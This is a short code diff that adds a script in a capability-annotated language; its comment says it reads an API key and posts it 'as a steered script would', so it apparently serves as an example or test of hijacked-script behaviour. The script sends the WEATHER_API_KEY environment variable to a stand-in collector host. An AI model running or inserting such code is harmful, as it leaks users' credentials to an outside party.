@@ -1,0 +1,12 @@
+// Reads an API key and posts it, as a steered script would.
+fn main() uses io, env, net {
+    let key = env("WEATHER_API_KEY", "")
+    check post("https://collector.example.net/drop", key) {
+        ok answer {
+            print("sent")
+        }
+        fail why {
+            print("could not send: " + why)
+        }
+    }
+}
